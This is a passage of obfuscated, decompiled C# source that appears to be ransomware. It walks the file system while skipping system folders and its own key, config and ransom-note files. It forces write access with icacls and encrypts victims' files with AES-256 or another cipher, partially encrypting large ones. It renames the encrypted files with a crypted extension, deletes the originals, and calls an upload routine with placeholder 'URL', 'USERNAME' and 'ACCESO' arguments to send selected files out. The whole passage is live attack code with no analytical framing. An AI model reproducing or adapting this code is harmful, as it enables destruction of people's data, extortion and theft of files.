			Parallel.ForEach(kWsOOJXlgNhgCq, delegate(string t1)
			{
				foreach (string item in DrqHUPaEXI)
				{
					if (((!item.Contains("C:\\Program Files\\") && !item.Contains("C:\\Program Files (x86)\\") && !item.Contains(":\\Windows\\") && !item.ToLower().Contains("perflogs") && !item.ToLower().Contains("internet explorer") && !item.Contains(":\\ProgramData\\") && !item.Contains("\\AppData\\") && !item.ToLower().Contains("msocache") && !item.ToLower().Contains("system volume information") && !item.ToLower().Contains("boot") && !item.ToLower().Contains("tor browser") && !item.ToLower().Contains("mozilla") && !item.ToLower().Contains("google chrome") && !item.ToLower().Contains("application data")) || item.Contains(joRKfFeYni("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI="))) && !item.Contains("autoexec.bat") && !item.Contains("desktop.ini") && !item.Contains("autorun.inf") && !item.Contains("ntuser.dat") && !item.Contains("NTUSER.DAT") && !item.Contains("iconcache.db") && !item.Contains("bootsect.bak") && !item.Contains("boot.ini") && !item.Contains("ntuser.dat.log") && !item.Contains("thumbs.db") && !item.ToLower().Contains("bootmgr") && !item.ToLower().Contains("pagefile.sys") && !item.ToLower().Contains("config.sys") && !item.ToLower().Contains("ntuser.ini") && !item.Contains(joRKfFeYni("QnVpbGRlcl9Mb2c=")) && !item.Contains("RSAKeys") && !item.Contains("ECCKeys") && !item.Contains("Config.enc") && !item.Contains("Инструкция") && !item.EndsWith(VDYusVfjQzojYiVO) && !item.EndsWith("exe") && !item.EndsWith("dll") && !item.EndsWith("EXE") && !item.EndsWith("DLL") && !item.Contains("Recycle.Bin") && !item.Contains(vDqPFVseLDSEcY) && !item.Contains(zRTqZqtXid) && !item.Contains(mPCnRrJrfRICdG))
					{
						if (ymmuLygdSdVjre.Length != 0)
						{
							string[] array4 = ymmuLygdSdVjre;
							int num2 = 0;
							while (num2 < array4.Length)
							{
								string value2 = array4[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0b8d;
							}
						}
						try
						{
							if (item.EndsWith(VDYusVfjQzojYiVO))
							{
								goto IL_0b8d;
							}
						}
						catch (Exception)
						{
							goto IL_0b8d;
						}
						if (item.EndsWith(t1) && !NnFouaTmgntTWt.Contains(item))
						{
							if (LitDbhWzmovijj == "YES")
							{
								try
								{
									if (fbDAqJbVdGX.muSdOUxGcrOy(item))
									{
										fbDAqJbVdGX.yDSXoshfrbq(item);
									}
								}
								catch
								{
								}
							}
							NnFouaTmgntTWt.Add(item);
							if (!jjfntRYhuFNxp.Contains(Path.GetDirectoryName(item)))
							{
								jjfntRYhuFNxp.Add(Path.GetDirectoryName(item));
							}
							SUdHgdcEVqPlo(item);
							try
							{
								new VYzGohYILkFyc().XUlcnnRhoSBk(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (aLMUqgosPdtj)
										{
											Console.WriteLine("Setting write access permission: " + item + " - File Size: " + new FileInfo(item).Length + " bytes");
											Console.WriteLine("----------------------------------------------------------------------------");
										}
									}
									catch
									{
									}
									xQfMOPCvvVAqwp(joRKfFeYni("aWNhY2xzLmV4ZQ=="), "\"" + item + "\"" + joRKfFeYni("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + joRKfFeYni("OkYgL1QgL0MgL1E="));
								}
							}
							catch (Exception ex14)
							{
								if (nOaztTOGmlogd)
								{
									try
									{
										File.AppendAllText(zRTqZqtXid, "File: " + item + " - Error while checking for user write access permission: " + ex14.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0530;
									}
									goto end_IL_052f;
									end_IL_0530:;
								}
								catch (Exception ex14)
								{
									if (nOaztTOGmlogd)
									{
										try
										{
											File.AppendAllText(zRTqZqtXid, "File: " + item + " - Error while reading if filesize is zero: " + ex14.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									ZmTUAzYynatCYr++;
									goto end_IL_052f;
								}
								byte[] bytes2;
								if (!(VPAHoMRqycZH == "YES") || new FileInfo(item).Length <= Convert.ToInt32(oIPxacaZFPrUD) * 1024 * 1024 || CeGwqiGcZtQOavm.Contains(t1))
								{
									if (FDgJvwVvfGwgSO)
									{
										VDYusVfjQzojYiVO = pwDwUXHyIHVn + VDYusVfjQzojYiVO;
									}
									bytes2 = Encoding.ASCII.GetBytes(EUefSwzLcwrcxo);
									if (VDYusVfjQzojYiVO != ".*")
									{
										if (!ZpQytShExiATF)
										{
											if (!zzEQfIIuvgiBbM)
											{
												yVretiDPSk(item, item + VDYusVfjQzojYiVO, SJplwSfijrqqcbsF);
											}
											else
											{
												yVretiDPSk(item, item + VDYusVfjQzojYiVO, Convert.FromBase64String(YuRsJqNWUQJzxx));
											}
										}
										else
										{
											try
											{
												if (!zzEQfIIuvgiBbM)
												{
													FmQycvGqoE(item, item + VDYusVfjQzojYiVO, SJplwSfijrqqcbsF, Convert.FromBase64String(zHvtZFBnnxDI));
												}
												else
												{
													FmQycvGqoE(item, item + VDYusVfjQzojYiVO, Convert.FromBase64String(YuRsJqNWUQJzxx), Convert.FromBase64String(zHvtZFBnnxDI));
												}
											}
											catch (Exception ex14)
											{
												if (nOaztTOGmlogd)
												{
													try
													{
														File.AppendAllText(zRTqZqtXid, "File: " + item + " - Error while fully writing to file: " + ex14.Message + "\r\n");
													}
													catch (Exception)
													{
													}
												}
												ZmTUAzYynatCYr++;
												try
												{
													File.Move(item + VDYusVfjQzojYiVO, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_052f;
											}
										}
									}
									else if (!ZpQytShExiATF)
									{
										if (!zzEQfIIuvgiBbM)
										{
											yVretiDPSk(item, item + ".part", SJplwSfijrqqcbsF);
										}
										else
										{
											yVretiDPSk(item, item + ".part", Convert.FromBase64String(YuRsJqNWUQJzxx));
										}
									}
									else
									{
										try
										{
											if (!zzEQfIIuvgiBbM)
											{
												FmQycvGqoE(item, item, SJplwSfijrqqcbsF, Convert.FromBase64String(zHvtZFBnnxDI));
											}
											else
											{
												FmQycvGqoE(item, item, Convert.FromBase64String(YuRsJqNWUQJzxx), Convert.FromBase64String(zHvtZFBnnxDI));
											}
										}
										catch (Exception ex14)
										{
											if (nOaztTOGmlogd)
											{
												try
												{
													File.AppendAllText(zRTqZqtXid, "File: " + item + " - Error while fully writing to file: " + ex14.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
											ZmTUAzYynatCYr++;
											goto end_IL_052f;
										}
									}
									if (zzEQfIIuvgiBbM)
									{
										if (VDYusVfjQzojYiVO != ".*")
										{
											iQdVnFhsXceS(item + VDYusVfjQzojYiVO, bytes2);
										}
										else
										{
											iQdVnFhsXceS(item, bytes2);
										}
									}
									goto IL_0b8d;
								}
								try
								{
									if (VDYusVfjQzojYiVO != ".*")
									{
										if (FDgJvwVvfGwgSO)
										{
											VDYusVfjQzojYiVO = pwDwUXHyIHVn + VDYusVfjQzojYiVO;
										}
										File.Move(item, item + VDYusVfjQzojYiVO);
									}
								}
								catch (Exception ex14)
								{
									if (nOaztTOGmlogd)
									{
										try
										{
											File.AppendAllText(zRTqZqtXid, "File: " + item + " - Error while renaming to crypted extension: " + ex14.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									ZmTUAzYynatCYr++;
									goto end_IL_052f;
								}
								dQotRvOnqv = "";
								if (VDYusVfjQzojYiVO != ".*")
								{
									dQotRvOnqv = item + VDYusVfjQzojYiVO;
								}
								else
								{
									dQotRvOnqv = item;
								}
								if (zZHWpuVxsPg == "YES")
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in CaWnKQHcaGrIr)
										{
											if (dQotRvOnqv.ToLower().EndsWith(item2 + VDYusVfjQzojYiVO) && CxqzogRLMjBXRE == "YES")
											{
												if (Convert.ToInt32(ChPvsDcZDKEbb) * 1024 * 1024 > new FileInfo(dQotRvOnqv).Length)
												{
													try
													{
														tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", dQotRvOnqv);
													}
													catch
													{
													}
												}
											}
											else if (dQotRvOnqv.ToLower().EndsWith(item2) && CxqzogRLMjBXRE == "NO")
											{
												try
												{
													tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", dQotRvOnqv);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								bytes2 = Encoding.ASCII.GetBytes(EUefSwzLcwrcxo);
								if (HjepCHoOwiDqIr == "NO")
								{
									byte[] array5 = null;
									byte[] array6 = LPxPUxFbwbiz.IXQbjATPSfee(dQotRvOnqv, Convert.ToInt32(oIPxacaZFPrUD) * 1024 * 1024);
									if (LPxPUxFbwbiz.vNGqufskYtzV(qsGNXaukFrpn: (!BnBkXlAwDSWJ) ? (zzEQfIIuvgiBbM ? LPxPUxFbwbiz.DJqnxaACLqbwV(array6, Convert.FromBase64String(YuRsJqNWUQJzxx), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LPxPUxFbwbiz.DJqnxaACLqbwV(array6, Convert.FromBase64String(YuRsJqNWUQJzxx), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (zzEQfIIuvgiBbM ? vrURVOQkkFzVFw.ZlRyaqmLMIOjEX(array6, Convert.FromBase64String(YuRsJqNWUQJzxx), Convert.FromBase64String(zHvtZFBnnxDI)) : vrURVOQkkFzVFw.ZlRyaqmLMIOjEX(array6, Convert.FromBase64String(YuRsJqNWUQJzxx), Convert.FromBase64String(zHvtZFBnnxDI))), RTZZWNJCGwYa: dQotRvOnqv, TCvcLhMGOtwKlg: bytes2))
									{
										goto IL_0b8d;
									}
									try
									{
										File.Move(item + VDYusVfjQzojYiVO, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!zzEQfIIuvgiBbM)
								{
									if (edRtLMSZmnqkqI.eIzMNjltVFURhx(dQotRvOnqv, oIPxacaZFPrUD, YuRsJqNWUQJzxx, null, Convert.FromBase64String(zHvtZFBnnxDI)))
									{
										goto IL_0b8d;
									}
									try
									{
										File.Move(item + VDYusVfjQzojYiVO, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (edRtLMSZmnqkqI.eIzMNjltVFURhx(dQotRvOnqv, oIPxacaZFPrUD, YuRsJqNWUQJzxx, bytes2, Convert.FromBase64String(zHvtZFBnnxDI)))
									{
										goto IL_0b8d;
									}
									try
									{
										File.Move(item + VDYusVfjQzojYiVO, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_052f:;
							}
							catch (Exception)
							{
								goto IL_0b8d;
							}
						}
					}
					continue;
					IL_0b8d:
					DrqHUPaEXI.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(DrqHUPaEXI, delegate(string fileInfo)
		{
			if (((!fileInfo.Contains("C:\\Program Files\\") && !fileInfo.Contains("C:\\Program Files (x86)\\") && !fileInfo.Contains(":\\Windows\\") && !fileInfo.ToLower().Contains("perflogs") && !fileInfo.ToLower().Contains("internet explorer") && !fileInfo.Contains(":\\ProgramData\\") && !fileInfo.Contains("\\AppData\\") && !fileInfo.ToLower().Contains("msocache") && !fileInfo.ToLower().Contains("system volume information") && !fileInfo.ToLower().Contains("boot") && !fileInfo.ToLower().Contains("tor browser") && !fileInfo.ToLower().Contains("mozilla") && !fileInfo.ToLower().Contains("google chrome") && !fileInfo.ToLower().Contains("application data")) || fileInfo.Contains(joRKfFeYni("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI="))) && !fileInfo.Contains("autoexec.bat") && !fileInfo.Contains("desktop.ini") && !fileInfo.Contains("autorun.inf") && !fileInfo.Contains("ntuser.dat") && !fileInfo.Contains("NTUSER.DAT") && !fileInfo.Contains("iconcache.db") && !fileInfo.Contains("bootsect.bak") && !fileInfo.Contains("boot.ini") && !fileInfo.Contains("ntuser.dat.log") && !fileInfo.Contains("thumbs.db") && !fileInfo.ToLower().Contains("bootmgr") && !fileInfo.ToLower().Contains("pagefile.sys") && !fileInfo.ToLower().Contains("config.sys") && !fileInfo.ToLower().Contains("ntuser.ini") && !fileInfo.Contains(joRKfFeYni("QnVpbGRlcl9Mb2c=")) && !fileInfo.Contains("RSAKeys") && !fileInfo.Contains("ECCKeys") && !fileInfo.Contains("Config.enc") && !fileInfo.Contains("Инструкция") && !fileInfo.EndsWith(VDYusVfjQzojYiVO) && !fileInfo.EndsWith("exe") && !fileInfo.EndsWith("dll") && !fileInfo.EndsWith("EXE") && !fileInfo.EndsWith("DLL") && !fileInfo.Contains("Recycle.Bin") && !fileInfo.Contains(vDqPFVseLDSEcY) && !fileInfo.Contains(zRTqZqtXid) && !fileInfo.Contains(mPCnRrJrfRICdG))
			{
				if (ymmuLygdSdVjre.Length != 0)
				{
					string[] array = ymmuLygdSdVjre;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!fileInfo.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d86;
					}
				}
				try
				{
					if (fileInfo.EndsWith(VDYusVfjQzojYiVO))
					{
						goto IL_0d86;
					}
				}
				catch (Exception)
				{
					goto IL_0d86;
				}
				if (!NnFouaTmgntTWt.Contains(fileInfo))
				{
					if (LitDbhWzmovijj == "YES")
					{
						try
						{
							if (fbDAqJbVdGX.muSdOUxGcrOy(fileInfo))
							{
								fbDAqJbVdGX.yDSXoshfrbq(fileInfo);
							}
						}
						catch
						{
						}
					}
					NnFouaTmgntTWt.Add(fileInfo);
					if (!jjfntRYhuFNxp.Contains(Path.GetDirectoryName(fileInfo)))
					{
						jjfntRYhuFNxp.Add(Path.GetDirectoryName(fileInfo));
					}
					SUdHgdcEVqPlo(fileInfo);
					try
					{
						new VYzGohYILkFyc().XUlcnnRhoSBk(fileInfo);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (aLMUqgosPdtj)
								{
									Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
							xQfMOPCvvVAqwp(joRKfFeYni("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + joRKfFeYni("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + joRKfFeYni("OkYgL1QgL0MgL1E="));
						}
					}
					catch (Exception ex2)
					{
						if (nOaztTOGmlogd)
						{
							try
							{
								File.AppendAllText(zRTqZqtXid, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(fileInfo).Length != 0L)
							{
								goto end_IL_068b;
							}
							goto end_IL_068a;
							end_IL_068b:;
						}
						catch (Exception ex2)
						{
							if (nOaztTOGmlogd)
							{
								try
								{
									File.AppendAllText(zRTqZqtXid, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							ZmTUAzYynatCYr++;
							goto end_IL_068a;
						}
						if (VPAHoMRqycZH == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(oIPxacaZFPrUD) * 1024 * 1024)
						{
							try
							{
								if (VDYusVfjQzojYiVO != ".*")
								{
									if (FDgJvwVvfGwgSO)
									{
										VDYusVfjQzojYiVO = pwDwUXHyIHVn + VDYusVfjQzojYiVO;
									}
									File.Move(fileInfo, fileInfo + VDYusVfjQzojYiVO);
								}
							}
							catch (Exception ex2)
							{
								if (nOaztTOGmlogd)
								{
									try
									{
										File.AppendAllText(zRTqZqtXid, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex2.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								ZmTUAzYynatCYr++;
								return;
							}
							if (VDYusVfjQzojYiVO != ".*")
							{
								fileInfo += VDYusVfjQzojYiVO;
							}
							if (zZHWpuVxsPg == "YES")
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in CaWnKQHcaGrIr)
									{
										if (fileInfo.ToLower().EndsWith(item3 + VDYusVfjQzojYiVO) && CxqzogRLMjBXRE == "YES")
										{
											if (Convert.ToInt32(ChPvsDcZDKEbb) * 1024 * 1024 > new FileInfo(fileInfo).Length)
											{
												try
												{
													tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", fileInfo);
												}
												catch
												{
												}
											}
										}
										else if (fileInfo.ToLower().EndsWith(item3) && CxqzogRLMjBXRE == "NO")
										{
											try
											{
												tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EUefSwzLcwrcxo);
							if (HjepCHoOwiDqIr == "NO")
							{
								byte[] array2 = null;
								byte[] array3 = LPxPUxFbwbiz.IXQbjATPSfee(fileInfo, Convert.ToInt32(oIPxacaZFPrUD) * 1024 * 1024);
								if (!LPxPUxFbwbiz.vNGqufskYtzV(qsGNXaukFrpn: (!BnBkXlAwDSWJ) ? (zzEQfIIuvgiBbM ? LPxPUxFbwbiz.DJqnxaACLqbwV(array3, Convert.FromBase64String(YuRsJqNWUQJzxx), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LPxPUxFbwbiz.DJqnxaACLqbwV(array3, Convert.FromBase64String(YuRsJqNWUQJzxx), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (zzEQfIIuvgiBbM ? vrURVOQkkFzVFw.ZlRyaqmLMIOjEX(array3, Convert.FromBase64String(YuRsJqNWUQJzxx), Convert.FromBase64String(zHvtZFBnnxDI)) : vrURVOQkkFzVFw.ZlRyaqmLMIOjEX(array3, Convert.FromBase64String(YuRsJqNWUQJzxx), Convert.FromBase64String(zHvtZFBnnxDI))), RTZZWNJCGwYa: fileInfo, TCvcLhMGOtwKlg: bytes))
								{
									try
									{
										File.Move(fileInfo + VDYusVfjQzojYiVO, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!zzEQfIIuvgiBbM)
							{
								if (!edRtLMSZmnqkqI.eIzMNjltVFURhx(fileInfo, oIPxacaZFPrUD, YuRsJqNWUQJzxx, null, Convert.FromBase64String(zHvtZFBnnxDI)))
								{
									try
									{
										File.Move(fileInfo + VDYusVfjQzojYiVO, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!edRtLMSZmnqkqI.eIzMNjltVFURhx(fileInfo, oIPxacaZFPrUD, YuRsJqNWUQJzxx, bytes, Convert.FromBase64String(zHvtZFBnnxDI)))
							{
								try
								{
									File.Move(fileInfo + VDYusVfjQzojYiVO, fileInfo);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (FDgJvwVvfGwgSO)
							{
								VDYusVfjQzojYiVO = pwDwUXHyIHVn + VDYusVfjQzojYiVO;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EUefSwzLcwrcxo);
							if (VDYusVfjQzojYiVO != ".*")
							{
								if (!ZpQytShExiATF)
								{
									if (!zzEQfIIuvgiBbM)
									{
										yVretiDPSk(fileInfo, fileInfo + VDYusVfjQzojYiVO, SJplwSfijrqqcbsF);
									}
									else
									{
										yVretiDPSk(fileInfo, fileInfo + VDYusVfjQzojYiVO, Convert.FromBase64String(YuRsJqNWUQJzxx));
									}
								}
								else
								{
									try
									{
										if (!zzEQfIIuvgiBbM)
										{
											FmQycvGqoE(fileInfo, fileInfo + VDYusVfjQzojYiVO, SJplwSfijrqqcbsF, Convert.FromBase64String(zHvtZFBnnxDI));
										}
										else
										{
											FmQycvGqoE(fileInfo, fileInfo + VDYusVfjQzojYiVO, Convert.FromBase64String(YuRsJqNWUQJzxx), Convert.FromBase64String(zHvtZFBnnxDI));
										}
									}
									catch (Exception ex2)
									{
										if (nOaztTOGmlogd)
										{
											try
											{
												File.AppendAllText(zRTqZqtXid, "File: " + fileInfo + " - Error while fully writing to file: " + ex2.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										ZmTUAzYynatCYr++;
										try
										{
											File.Move(fileInfo + VDYusVfjQzojYiVO, fileInfo);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!ZpQytShExiATF)
							{
								if (!zzEQfIIuvgiBbM)
								{
									yVretiDPSk(fileInfo, fileInfo + ".part", SJplwSfijrqqcbsF);
								}
								else
								{
									yVretiDPSk(fileInfo, fileInfo + ".part", Convert.FromBase64String(YuRsJqNWUQJzxx));
								}
							}
							else
							{
								try
								{
									if (!zzEQfIIuvgiBbM)
									{
										FmQycvGqoE(fileInfo, fileInfo, SJplwSfijrqqcbsF, Convert.FromBase64String(zHvtZFBnnxDI));
									}
									else
									{
										FmQycvGqoE(fileInfo, fileInfo, Convert.FromBase64String(YuRsJqNWUQJzxx), Convert.FromBase64String(zHvtZFBnnxDI));
									}
								}
								catch (Exception ex2)
								{
									if (nOaztTOGmlogd)
									{
										try
										{
											File.AppendAllText(zRTqZqtXid, "File: " + fileInfo + " - Error while fully writing to file: " + ex2.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									ZmTUAzYynatCYr++;
									return;
								}
							}
							if (zzEQfIIuvgiBbM)
							{
								if (VDYusVfjQzojYiVO != ".*")
								{
									iQdVnFhsXceS(fileInfo + VDYusVfjQzojYiVO, bytes);
								}
								else
								{
									iQdVnFhsXceS(fileInfo, bytes);
								}
							}
						}
						end_IL_068a:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d86;
			IL_0d86:
			DrqHUPaEXI.Remove(fileInfo);
		});
	}

	private static void MdZIuCixlcSgzc(string WDgucedYZhp, string MKUnLhFptmZXBB, byte[] yQgsheDjXvHAtUl)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(MKUnLhFptmZXBB, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(yQgsheDjXvHAtUl, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(WDgucedYZhp, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (MKUnLhFptmZXBB.Length > 0)
				{
					FileStream fileStream3 = new FileStream(WDgucedYZhp, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (zZHWpuVxsPg == "YES")
					{
						foreach (string item in CaWnKQHcaGrIr)
						{
							if (WDgucedYZhp.ToLower().EndsWith(item) && CxqzogRLMjBXRE == "YES")
							{
								if (Convert.ToInt32(ChPvsDcZDKEbb) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", WDgucedYZhp);
									}
									catch
									{
									}
								}
							}
							else if (WDgucedYZhp.ToLower().EndsWith(item) && CxqzogRLMjBXRE == "NO")
							{
								try
								{
									tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", WDgucedYZhp);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(WDgucedYZhp) && num2 >= 0)
							{
								File.Delete(WDgucedYZhp);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (MKUnLhFptmZXBB.EndsWith(".part"))
					{
						File.Move(MKUnLhFptmZXBB, MKUnLhFptmZXBB.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(MKUnLhFptmZXBB);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void FmQycvGqoE(string WrzcitEBbol, string zVrbJtpLNMnt, byte[] rSzQtnWJlorKP, byte[] ldkiHzhDSAl = null)
	{
		try
		{
			if (zZHWpuVxsPg == "YES")
			{
				FileStream fileStream = new FileStream(WrzcitEBbol, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in CaWnKQHcaGrIr)
				{
					if (WrzcitEBbol.ToLower().EndsWith(item) && CxqzogRLMjBXRE == "YES")
					{
						if (Convert.ToInt32(ChPvsDcZDKEbb) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", WrzcitEBbol);
							}
							catch
							{
							}
						}
					}
					else if (WrzcitEBbol.ToLower().EndsWith(item) && CxqzogRLMjBXRE == "NO")
					{
						try
						{
							tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", WrzcitEBbol);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (WrzcitEBbol != zVrbJtpLNMnt)
		{
			File.Move(WrzcitEBbol, zVrbJtpLNMnt);
			WrzcitEBbol = zVrbJtpLNMnt;
		}
		byte[] bytes = vrURVOQkkFzVFw.ZlRyaqmLMIOjEX(File.ReadAllBytes(WrzcitEBbol), rSzQtnWJlorKP, ldkiHzhDSAl);
		File.WriteAllBytes(WrzcitEBbol, bytes);
		UrQRBEHxUHKK++;
	}

	private static void yVretiDPSk(string MZjyNDaBBAUd, string qeNqTsZYZbMASjf, byte[] YbbNPMwkjJoDnjazs)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = qeNqTsZYZbMASjf;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(YbbNPMwkjJoDnjazs, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (BHMRzZEpeyy == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(MZjyNDaBBAUd, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(MZjyNDaBBAUd, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream2 = new FileStream(MZjyNDaBBAUd, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (qeNqTsZYZbMASjf.Length > 0)
				{
					if (zZHWpuVxsPg == "YES")
					{
						FileStream fileStream3 = new FileStream(MZjyNDaBBAUd, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in CaWnKQHcaGrIr)
						{
							if (MZjyNDaBBAUd.ToLower().EndsWith(item) && CxqzogRLMjBXRE == "YES")
							{
								if (Convert.ToInt32(ChPvsDcZDKEbb) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", MZjyNDaBBAUd);
									}
									catch
									{
									}
								}
							}
							else if (MZjyNDaBBAUd.ToLower().EndsWith(item) && CxqzogRLMjBXRE == "NO")
							{
								try
								{
									tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", MZjyNDaBBAUd);
								}
								catch
								{
								}
							}
						}
						fileStream3.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(MZjyNDaBBAUd);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (qeNqTsZYZbMASjf.EndsWith(".part"))
					{
						File.Move(qeNqTsZYZbMASjf, qeNqTsZYZbMASjf.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
